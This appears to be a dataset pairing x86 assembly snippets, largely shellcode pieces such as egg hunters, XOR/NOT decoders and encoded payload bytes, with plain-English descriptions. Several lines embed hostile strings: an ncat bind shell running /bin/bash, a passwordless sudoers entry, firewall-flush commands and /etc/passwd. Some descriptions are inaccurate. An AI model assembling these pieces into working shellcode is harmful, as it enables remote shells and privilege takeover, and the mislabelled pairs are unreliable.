cmp bl, 0xaa \n je shellcode	if the contents of the bl register is equal to the value 0xaa then jump to the shellcode label
cmp bl, 0xaa \n je shellcode	jump to the shellcode label if the contents of the bl register is equal to the value 0xaa
cmp bl, 0xaa \n jz shellcode	jump to shellcode if bl is equal to 0xaa
cmp bl, 0xaa \n jz shellcode \n cmp bl, 0xbb \n jz xordecode jmp notdecode	compare the content of bl register with the end character, 0xaa. if they arer equal go to shellcodelable, else compare the content of bl register with the character 0xbb that is the placeholder for xor. if they are equal go to _xordecode label. else go to _notdecode label.
cmp bl, 0xbb \n je xordecode \n jmp notdecode	if the contents of the bl register is equal to the value 0xbb then jump to the xordecode label else jump to the notdecode label
cmp bl, 0xbb \n je xordecode \n jmp notdecode	jump to the xordecode label if the contents of the bl register is equal to the value 0xbb else jump to the notdecode label
cmp bl, 0xbb \n jz xordecode \n jmp notdecode	jump to xordecode if bl is equal to 0xbb else jump to notdecode
cmp bl, 48	compare ebx register's lower half value against ascii value 48
cmp bl, 57	compare ebx register's lower half value against ascii value 57
cmp bl, 78h \n jg short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is greater than the value 78h
cmp bl, 78h \n jg short loc_402B1D	if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D
cmp bl, 78h \n jge short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is greater than or equal to the value 78h
cmp bl, 78h \n jge short loc_402B1D	if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D
cmp bl, 78h \n jl short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is less than the value 78h
cmp bl, 78h \n jl short loc_402B1D	if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D
cmp bl, 78h \n jle short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h
cmp bl, 78h \n jle short loc_402B1D	if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D
cmp bl, al \n je loop_2	jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register
cmp bl, al \n je loop_2	if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label
cmp bl, al \n je loop_2 \n jmp short not_found	jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label
cmp bl, al \n je loop_2 \n jmp short not_found	if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label
cmp byte [buff], 61h	compare the byte at the memory location buff with 61h
cmp byte [buff], 7ah	compare the byte at the memory location buff with 7ah
cmp byte [eax], 0	compare the byte pointed to by eax at this address against zero
cmp byte [ebp+ecx], 61h	compare the byte at the memory location ebp+ecx with 61h
cmp byte [ebp+ecx], 7ah	compare the byte at the memory location ebp+ecx with 7ah
cmp BYTE [edx], 0x2e \n jne l2	jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e
cmp BYTE [edx], 0x2e \n jne l2	if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label
cmp BYTE [edx], 0x2e \n jne l2 \n jmp while	jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label
cmp BYTE [edx], 0x2e \n jne l2 \n jmp while	if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label else jump to the while label
cmp byte [esi], 0x7	compare the byte in esi with 0x7
cmp BYTE [esi], 0x7 \n jl lowbound	jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7
cmp BYTE [esi], 0x7 \n jl lowbound	if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label
cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7	if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register
cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7	jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register
cmp BYTE [esi], 0x7 \n jle lowbound	if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7 then jump to the lowbound label
cmp BYTE [esi], 0x7 \n jle lowbound	jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7
cmp byte [esi], 0x88 \n jz shellcode	jump to shellcode label if the byte in esi is equal to 0x88
cmp byte [esi], 0xd	compare the byte at the address esi and 0xd
cmp byte [esi], 0xd \n jl wrap_around	if esi content is less then 13 go to wrap_aroud
cmp byte [esi], 0xD \n jl wrap_around	jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD
cmp byte [esi], 0xD \n jl wrap_around	if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label
cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD	jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register
cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD	if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register
cmp byte [esi], 0xD \n jle wrap_around	if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD then jump to the wrap_around label
cmp byte [esi], 0xD \n jle wrap_around	jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD
cmp byte [esi], bl \n jne not_equal	jump to not_equal if the current byte of the shellcode is not equal to bl
cmp BYTE al, 2 \n je do_inject	jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register
cmp BYTE al, 2 \n je do_inject	if the byte representation of 2 is equal to the contents of the al register then jump to the label do_inject
cmp BYTE al, 2 \n je do_inject \n jmp while	jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label
cmp BYTE al, 2 \n je do_inject \n jmp while	if the byte representation of 2 is equal to the contents of the al register else jump to the while label then jump to the label do_inject
cmp BYTE bl, [esi] \n jne loop_1	jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register
cmp BYTE bl, [esi] \n jne loop_1	if the first byte of the esi register is not equal to the contents of the bl register then jump to the label loop_1
cmp cl, 0x11 \n jb 0xff \n add dl, 0x5	jump to the memory address 0xff if the unsigned contents of the cl register is lower than the unsigned value 0x11 else add the 0x5 value to the dl register
cmp cl, 0x11 \n jb 0xff \n add dl, 0x5	if the unsigned contents of the cl register is lower than the unsigned value 0x11 then jump to the memory address 0xff else add the 0x5 value to the dl register
cmp cl, 0x3 \n jne loop	jump to the loop label if the contents of the cl register is not equal to the value 0x3
cmp cl, 0x3 \n jne loop	if the contents of the cl register is not equal to the value 0x3 then jump to the loop label
cmp cl, 0x3 \n jne loop2	jump to the loop2 label if the contents of the cl register is not equal to the value 0x3
cmp cl, 0x3 \n jne loop2	if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label
cmp cl, 0xff \n jne dup2	if the contents of cl are not equal to the hexadecimal value oxff, jump to the _dup2 label
cmp cl, 12 \n jg l2	jump to the label l2 if the contents of the cl register is greater than the decimal value 12
cmp cl, 12 \n jg l2	if the contents of the cl register is greater than the decimal value 12 then jump to the label l2
cmp cl, 12 \n jge l2	jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12
cmp cl, 12 \n jge l2	if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2
cmp cl, dl \n jb l3	jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register
cmp cl, dl \n jb l3	if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3
cmp cl, dl \n je encodedshellcode	if cl contents is equal to dl contents jump to _encodedshellcode label
cmp cl, dl \n je EncodedShellcode	jump to the EncodedShellcode label if the contents of the cl register is equal to the contents of the dl register
cmp cl, dl \n je EncodedShellcode	if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label
cmp cl, dl \n je init	if cl contents is equal to dl contents jump to _init label
cmp cl, dl \n je init \n inc cl	jump to the init label if the contents of the cl register is equal to the contents of the dl register else increment the contents of the cl register
cmp cl, dl \n je init \n inc cl	if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register
cmp cx, 2 \n jle dupcount	jump to dupcount if cx is less than or equal to 2 with sign
cmp dl, 1 \n je exit \n jmp reading	jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label
cmp dl, 1 \n je exit \n jmp reading	if the contents of the dl register is equal to the vale 1 then jump to the exit label else jump to the reading label
cmp dl, 1h	compare the contents of the dl register and 1h
cmp dl, 1h \n jz exit	compare 1h and dl content and go to _exit if flag zero is set
cmp dl, 27 \n jg l3	if the contents of the dl register is greater than the decimal value 27 then jump to the label l3
cmp dl, 27 \n jg l3	jump to the label l3 if the contents of the dl register is greater than the decimal value 27
cmp dl, 27 \n jge l3	jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27
cmp dl, 27 \n jge l3	if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3
cmp dl, cl \n jb l1 \n mov al, 0x39	jump to the label l1 if the unsigned contents of the dl register is lower than the unsigned contents of the cl register else move the value 0x39 to the al register
cmp dl, cl \n jb l1 \n mov al, 0x39	if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register
cmp dword [eax-4], egg1	compare the dword at the address [eax-4] and egg1
cmp dword [eax-4], egg1 \n jne _next \n jmp eax	jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register
cmp dword [eax-4], egg1 \n jne _next \n jmp eax	if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register
cmp dword [eax-4], egg2 \n je _next \n jmp eax	jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register
cmp dword [eax-4], egg2 \n je _next \n jmp eax	if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register
cmp dword [eax-4],egg1	compare the dword at the memory location [eax-4] with the value of egg1
cmp dword [eax-8], egg	compare the dword at the address [eax-8] and egg
cmp dword [eax-8], egg \n jne _next	jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address
cmp dword [eax-8], egg \n jne _next	if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label
cmp dword [eax-8],egg	compare the dword at the memory location [eax-8] with the value of egg
cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax	jump to the jne _start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register
cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register
cmp dword [eax], ebx	compare the dword at the address [eax] and the contents of the ebx register
cmp dword [eax], ebx \n jne next_addr \n jmp eax	if ebx content is not equal to the double word contained into eax register go to next_adrr label else go to eax address
cmp dword [eax], ebx \n jne next_addr \n jmp eax	jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register
cmp dword [eax], ebx \n jne next_addr \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register
cmp DWORD [eax], edx \n jne loop \n jmp eax	jump to the loop label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
cmp DWORD [eax], edx \n jne loop \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register
cmp dword [eax], edx \n jne search_the_egg	compare eax with the egg_sig, if not compare jump to search_the_egg
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register
cmp DWORD [edx], 0x636f7270 \n je while	if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270 then jump to the while label
cmp DWORD [edx], 0x636f7270 \n je while	jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270
cmp dword [esi + edx + 5], edi \n jz execute_shellcode	jump to execute_shellcode if the doubleword in esi+edx+5 is equal to edi
cmp dword [var], 10	compare the doubleword stored at memory location var to the integer value 10
cmp dword ptr [eax],edx \n jne loop	id edx content and dword pointed by eax are different go to loop label
cmp dx, 00	compare the dx value with zero
cmp dx, 0x03e8 \n je L1	jump to the L1 label if the contents of the dx register is equal to the value 0x03e8
cmp dx, 0x03e8 \n je L1	if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label
cmp eax, 0	compare eax to zero
cmp eax, 0	compare if eax is equal to 0
cmp eax, 0	compare if eax is zero
cmp eax, eax	compare the contents of eax and the contents of eax
cmp eax, eax \n jne 0x8	jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register
cmp eax, eax \n jne 0x8	if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8
cmp eax, eax \n jne 0x8 \n xor eax, eax	jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register else zero out the eax register
cmp eax, eax \n jne 0x8 \n xor eax, eax	if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register
cmp eax, ebp \n jnz short loc_40102B	jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register
cmp eax, ebp \n jnz short loc_40102B	if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B
cmp eax, ebx	compare eax with ebx
cmp eax, ebx	compare the contents of eax and the contents of ebx
cmp eax, ebx	compare the contents of the eax register and the contents of the ebx register
cmp eax, ebx \n je 0x47	jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register
cmp eax, ebx \n je 0x47	if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47
cmp eax, ebx \n je 0x47 \n xor ecx, ecx	if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register
cmp eax, ebx \n je 0x47 \n xor ecx, ecx	jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register
cmp eax, ebx \n je all	if eax and ebx content are equal go to _all label
cmp eax, ebx \n je all	jump to the all label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je all	if the contents of the eax register is equal to the contents of the ebx register then jump to the all label
cmp eax, ebx \n je all \n xor eax, eax	jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register
cmp eax, ebx \n je all \n xor eax, eax	if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register
cmp eax, ebx \n je child	jump to the child label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je child	if the contents of the eax register is equal to the contents of the ebx register then jump to the child label
cmp eax, ebx \n je connect \n ja exit	compare ebx and eax content. if they are equal go to _connect label, else go to _exit label
cmp eax, ebx \n je connect \n ja exit	jump to the connect label if the contents of the eax register is equal to the contents of the ebx register else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register
cmp eax, ebx \n je connect \n ja exit	if the contents of the eax register is equal to the contents of the ebx register then jump to the connect label else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register
cmp eax, ebx \n je download	if the contents of the eax register is equal to the contents of the ebx register then jump to the download label
cmp eax, ebx \n je download	jump to the download label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je exit	if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label
cmp eax, ebx \n je exit	jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je exit \n add al, 0x3	jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register
cmp eax, ebx \n je exit \n add al, 0x3	if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register
cmp eax, ebx \n je exit \n mov al, 0x4	jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x4 into the al register
cmp eax, ebx \n je exit \n mov al, 0x4	if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register
cmp eax, ebx \n je L1	jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je L1	if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label
cmp eax, ebx \n jne retry	jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register
cmp eax, ebx \n jne retry	if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label
cmp eax, ebx \n jz 0x47	compare eax with ebx content, if the xero flag is set go to the address 0x47
cmp eax, edi \n jne infinite	if edi content is not equal to eax content go to _infinite label
cmp eax, edi \n jne infinite	jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register
cmp eax, edi \n jne infinite	if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label
cmp eax, edi \n jne infinite \n xor eax, eax	jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register
cmp eax, edi \n jne infinite \n xor eax, eax	if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label else zero out the eax register
cmp eax,0xf3ab0aba	compare hexadecimal value 0xf3ab0aba with eax
cmp eax,ebx	compare the contents of eax with ebx
cmp eax,ebx \n je exit	if eax content is equal to ebx content jump to _exit label
cmp eax,ebx \n jne retry	compare ebx with eax content. if they are not equal go to _retry label
cmp eax,ebx \n jz download	compare ebx and eax content then jump to download_label if the result of the comparison is 0
cmp ebp, 0	compare the contents of the ebp register with the value 0
cmp ebx, 0	compare if ebx is zero
cmp ebx, 9 \n ja exit \n jmp loop	jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label
cmp ebx, 9 \n ja exit \n jmp loop	if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label
cmp ecx, 0	compare ecx to 0
cmp ecx, 0	compare if ecx is zero
cmp ecx, 0h	compare ecx with 0h
cmp ecx, 10	compare if ecx is equal to 10
cmp ecx, 100	compare if ecx is equal to 100
cmp ecx, 100	compare if our counter is equal to 100
cmp ecx, 5	compare ecx with 5
cmp ecx, ebp	compare ecx and ebp
cmp ecx, ebp	compare the contents of the ecx register with the contents of the ebp register
cmp ecx, edx \n ja l1	jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register
cmp ecx, edx \n ja l1	if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else
cmp edi, 0	compare if edi is equal to 0
cmp edx, 0	compare if edx is zero
cmp edx, 0x43 \n ja loop \n push edx	jump to the loop label if the unsigned contents of the edx register is greater than the unsigned value 0x43 else push the contents of the edx register onto the stack
cmp edx, 0x43 \n ja loop \n push edx	if the unsigned contents of the edx register is greater than the unsigned value 0x43 then jump to the loop label else push the contents of the edx register onto the stack
cmp edx, 10	compare whether the edx register has reached 10
cmp edx, 42	compare the contents of edx to 42
cmp edx, 42 \n je short loc_402B13	jump to loc_402B13 if the contents of the edx register is equal to 42
cmp edx, 42 \n je short loc_402B13	if the contents of the edx register is equal to 42 then jump to loc_402B13
cmp edx, ebx	compare the contents of edx and the contents of ebx
cmp edx, ebx \n je 0x8 \n	jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register
cmp edx, ebx \n je 0x8 \n	if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8
cmp edx, ebx \n je 0x8 \n mov ebx, edx	jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register
cmp edx, ebx \n je 0x8 \n mov ebx, edx	if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8 else move the contents of the edx register into the ebx register
cmp esi, 10	compare if esi is equal to 10
cmp esi, edx \n je find_egg	jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register
cmp word [ecx], 0x5951	compare the word at the address ecx and 0x5951
cmp word [ecx], 0x5951 \n loopnz next \n jmp ecx	compare ecx content with the marker, then decrement ecx by 1 and if cx != 0 and the zero flag is clear go to _next else go to ecx address
cmp[esi], edx \n jz find_egg \n call esi	check if we have found the egg. in case of negative response go to find_egg label else call esi
cmps byte ptr ds:[esi],byte ptr es:[edi]	subtract the value at location esi from the value a location edi without saving results. update flags based on the subtraction and the index registers esi and edi.
code:	declare code_label
code:	define the code label
common_commands: \n inc esi	in common_commands point to the next byte in esi
connect:	define _connect label
connect:	define connect function
cont:	define _cont label
cont:	define the cont label
contents db 'hello world!', 0h	define a string db and initialize to 'hello world!'
createfile:	define _createfile label
createfile:	declare the createfile label
createfile:	define createfile function
cycle:	define cycle label
cycle:	define cycle
cycle:	declare the cycle label
D1: \n mov bl, byte [esi]	in D1 move the current byte of the shellcode in the bl register
D1: \n mov cl, byte [esi]	declare D1 and move the current byte of the shellcode in the cl register
D1: \n mov dl, byte [esi]	declare D1 and move the current byte of the shellcode in the dl register
D1: \n pop esi \n mov edi, esi	in D1 save the shellcode in esi and move it to edi
D2: \n not byte [esi]	declare the function D2 and negate the byte in esi
D2: \n not byte [esi]	define the function D2 and negate the byte in esi
D2: \n not byte [esi]	declare the function D2 and negate the current byte of the shellcode
D2: \n pop esi \n mov edi, esi	define D2 save the in esi the pointer to the shellcode and move esi into edi
D3: \n add byte [esi], 5	declare the ruotine D3 and add the value 5 to the current byte of the shellcode
D3: \n add byte [esi], 8	declare the ruotine D3 and add the value 8 to the current byte of the shellcode
D3: \n pop esi \n mov edi, esi	declare the function D3, store the shellcode in edi and move the pointer into esi
D3: \n sub byte [esi], 7	define function D3 and subtract 7 from the current byte of the shellcode
D4: \n pop esi \n mov edi, esi	in D4 store the shellcode in edi and move the pointer into esi
D4: \n xor byte [esi], 0x1	define the function D4 and perform the xor operation between the byte in esi and the 0x1 value
D4: \n xor byte [esi], 0x12	define the function D4 and perform the xor operation between the byte of the shellcode and the 0x12 value
D4: \n xor byte [esi], 0x5	define the function D4 and perform the xor operation between the byte in esi and the 0x5 value
das	decimal adjust al register after subtraction.
das	correct the result in al register of the previous bcd subtraction operation.
data:	declare the data label
db ',ajm,pk#########'	define the byte string ',ajm,pk#########'
db '/bin/sh'	define a byte string and initialize it to '/bin/sh'
db '/bin/sh'	define the byte string '/bin/sh'
db '/bin/sh#sh#'	define the byte string '/bin/sh#sh#'
db '/etc/passwd#'	define the byte string '/etc/passwd#'
db '/proc/sys/kernel/randomize_va_spacex'	define the byte string '/proc/sys/kernel/randomize_va_spacex'
db '/sbin/insmod#/tmp/o.o'	define the byte string '/sbin/insmod#/tmp/o.o'
db '/sbin/ipchains#-f#'	define the byte string '/sbin/ipchains#-f#'
db '/sbin/iptables#-f#'	define the byte string '/sbin/iptables#-f#'
db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'	define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
db '0',10	define the byte string '0',10
db 'all all=(all) nopasswd: all', 0xa	define the byte string 'all all=(all) nopasswd: all'
db 'cp /bin/sh /tmp/sh'	define the byte string 'cp /bin/sh /tmp/sh'
db 'egg mark'	initialize a string to 'egg mark'
db 'egg mark'	define the byte string 'egg mark'
db 'my.txtx'	define the byte string 'my.txtx'
db 'rm -f /tmp/f'	define the byte string 'rm -f /tmp/f'
db 0ah	define the byte string ‘0ah’
db 0b1h	define the byte string ‘0b1h’
db 0b8h	define the byte string ‘0b8h’
db 0c6h	define the byte string ‘0c6h’
db 0d8h	define the byte string ‘0d8h’
db 0e2h	define the byte string ‘0e2h’
db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b	define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b
db 0x68	declare a byte contining 0x68
db 0x68	declare a byte with no label containing the value 0x68
db 0x80	declare a byte and initialize it to 0x80
db 0x80	declare an unlabeled byte initialized to 0x80
db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d	define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
db 0xcd	define a byte and initialize it to 0xcd
db 0xcd	define the byte 0xcd
db 10	declare a byte with no label containing the value 10
db 10	declare an unlabeled byte initialized to 10
db 20h	define the byte string ‘20h’
db 24h	define the byte string ‘24h’
db 60h	define the byte string ‘60h’
db 69h	define the byte string ‘69h’
db 70h	define the byte string ‘70h’
db 80h	define the byte string ‘80h’
db 81h	define the byte string ‘81h’
db 83h	define the byte string ‘83h’
db 87h	define the byte string ‘87h’
db 8bh	define the byte string ‘8bh’
db 9ah	define the byte string ‘9ah’
dd 0xdeadbeef	define a byte and initialize it to 0xdeadbeef
dd 0xdeadbeef \n dd 0xdeadbeef	define double word 0xdeadbeef two times
dec al \n jz shellcode	decrement the al register and jump to shellcode if the result is zero
dec bl \n jnz L1	decrement the bl register and jump to L1 if the result is not zero
dec bl \n jz L1	decrement the bl register and jump to L1 if the result is zero
dec byte dl	decrement the byte at the address dl by one
dec byte dl	decrement the byte in dl
dec cl	decrement cl by1
dec cl	decrement cl register by 1
dec cl	decrement cl register
dec cl	drement cl content by 1
dec cl	decrement counter
dec cl	decrement the counter
dec cl	decrement the cl register by one
dec cl	decrement the contents of cl
dec cl	decrement the contents of the cl register
dec cl \n jns dup2	decrement the contents of the cl register and jump to the dup2 label if the result is not negative
dec cl \n jns loop_dup	decrement the contents of the cl register and jump to the loop_dup label if the result is not negative
dec cl \n jns loopinghere	decrement the contents of the cl register and jump to the loopinghere label if the result is not negative
dec cl \n jnz L2	decrement cl and jump to L2 if the result is not equal to zero
dec cl \n jz L2	decrement cl and jump to L2 if the result is zero
dec dl	decrement dl
dec dl	decrement the dl register by one
dec dl \n jnz L3	decrement dl and jump to L3 if the result is not zero
dec dl \n jz L3	decrement dl and jump to L3 if the result is zero
dec eax	decrements eax by 1
dec eax	decrement eax content
dec eax	decrement eax content by 1
dec eax	decrement the contents of the eax register
dec eax	subtract one from the contents of eax
dec eax	decrement the eax register by one
dec eax	decrement eax
dec ebp	decrease ebp
dec ebx	decrement ebx by 1
dec ebx	decrement ebx
dec ebx	decrease ebx by 1
dec ebx	subtract one from the contents of ebx
dec ebx	decrement the ebx register by one
dec ecx	decrements ecx by 1
dec ecx	decrement ecx by 1
dec ecx	decrement ecx
dec ecx	decrement ecx register
dec ecx	decrement loop counter
dec ecx	decrement the counter ecx
dec ecx	decrement ecx alias loop counter
dec ecx	decrement loop-counter
dec ecx	decrement ecx content
dec ecx	decrement ecx content by 1
dec ecx	count down to zero
dec ecx	decrement counter
dec ecx	decrease ecx by 1
dec ecx	decrement the contents of the ecx register
dec ecx	decrement the ecx register by one
dec ecx \n jns _dup2_loop	decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative
dec ecx \n jns 2f_loop	decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative
dec ecx \n jns dup2	decrement the contents of the ecx register and jump to the dup2 label if the result is not negative
dec ecx \n jns dup2loop	decrement the contents of the ecx register and jump to the dup2loop label if the result is not negative
dec ecx \n jns dup2loop	decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0
dec ecx \n jns duploop	decrement the contents of the ecx register and jump to the duploop label if the result is not negative
dec ecx \n jns loop	decrement ecx by 1 and as long as sf is not set, jump to _loop label
dec ecx \n jns loop	decrement the contents of the ecx register and jump to the loop label if the result is not negative
dec ecx \n jns loop2	decrement the contents of the ecx register and jump to the loop2 label if the result is not negative
dec ecx \n jz counter_is_now_zero	decrement the contents of the ecx register and jump to the counter_is_now_zero label if the result is zero
dec edi	decrement edi register
dec edi	decrement edi content
dec edx	decrement edx content by 1
dec edx	decrement the edx register by one
dec edx	decrement edx
dec esp	decrement esp
dec esp	decrement the esp register by one
decode_insertion:	define decode_insertion label
decode_loop:	decode_loop
decode_pr:	define decode_pr label
decode_pr:	decode_pr function
decode_xor:	define decode_xor label
decode:	define _decode label
decode:	declare _decode label
decode:	define decode label
decode:	define _ decode label
decode:	define decode function
decode:	declare the decode label
decode:	define the decode label
decode:	function decode
decode:	decode function
decode:	decode routine
decode:	decode label
decode: \n cmp byte [esi], 0x7 \n jl lowbound \n sub byte [esi], 0x7 \n jmp common_commands	in the decode function jump to lowbound label if the current byte of the shellcode is lower than 0x7 else subtract 0x7 from the byte of the shellcode and jump to common_commands
decode: \n mov bl, byte [esi]	in decode move the current byte of the shellcode in the bl register
decode: \n not byte [esi]	define the decode function and negate the byte in esi
decode: \n sub byte [esi], 13	define decode function and subtract 13 from the current byte of the shellcode
decode: \n xor byte [esi], 0xaa	define the decode function and perform the xor operation between the byte in esi and the 0xaa value
decoded_shellcode:	define _decoded_shellcode label
decoded_shellcode:	define decoded_shellcode function
decoded_shellcode: \n call [esp]	declare the decoded_shellcode label and call the stack
decoder_setup:	decoder_setup label
decoder_value: db 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d	define decoder_value as an array of the following bytes: 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d, 0x7d
